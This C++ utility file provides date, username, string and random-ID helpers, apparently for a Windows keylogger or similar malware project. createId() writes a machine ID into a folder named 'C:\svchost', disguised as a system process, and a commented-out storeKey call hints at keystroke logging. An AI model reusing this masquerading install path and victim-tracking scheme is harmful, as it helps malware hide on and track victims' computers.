#include <sstream> 
#include <fstream>
#include <windows.h>
#include <Lmcons.h>
#include <ctime>
#include <direct.h>
#include <tlhelp32.h>
#include <vector>

#include "FileHandler.h"
#include "Utils.h"
    
const std::string getCurrentDateTime(bool includeHours) {
    time_t     now = time(0);
    struct tm  tstruct;
    char       buf[80];
    tstruct = *localtime(&now);
    if(includeHours)
        strftime(buf, sizeof(buf), "%Y-%m-%d.%X", &tstruct);
    else
        strftime(buf, sizeof(buf), "%Y-%m-%d", &tstruct);

    return buf;
}

std::string getUserName(){
    TCHAR name [ UNLEN + 1 ];
        DWORD size = UNLEN + 1;
        GetUserName( (TCHAR*)name, &size );
        std::stringstream ss;
        std::string userName;
        ss << name;
        ss >> userName;
        return userName;
}

std::wstring s2ws(const std::string& s){
    int len;
    int slength = (int)s.length() + 1;
    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
    wchar_t* buf = new wchar_t[len];
    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
    std::wstring r(buf);
    delete[] buf;
    return r;
}

std::string generateRandomNumber(){
    srand (time(0));
    int intRandomNumber = rand () % 10000+1;
    char charRandomNumber[6];
    itoa(intRandomNumber,charRandomNumber, 10);
    std::string stringRandomNumber = std::string(charRandomNumber);

    return stringRandomNumber;
}

std::string createId(){
   mkdir("C:\\svchost");
   
   std::ofstream sysid("C:\\svchost\\conid.dat");
   std::string id = generateRandomNumber();
   sysid << id;
   //storeKey("First run!");
   return id;
}

std::vector<std::string> split(const std::string &text, char sep) {
  std::vector<std::string> tokens;
  std::size_t start = 0, end = 0;
  while ((end = text.find(sep, start)) != std::string::npos) {
    tokens.push_back(text.substr(start, end - start));
    start = end + 1;
  }
  tokens.push_back(text.substr(start));
  return tokens;
}

std::string getMonth(){
    return split(getCurrentDateTime(false), '-')[1];
}

int getMonthInt(){
    return atoi(split(getCurrentDateTime(false), '-')[1].c_str());
}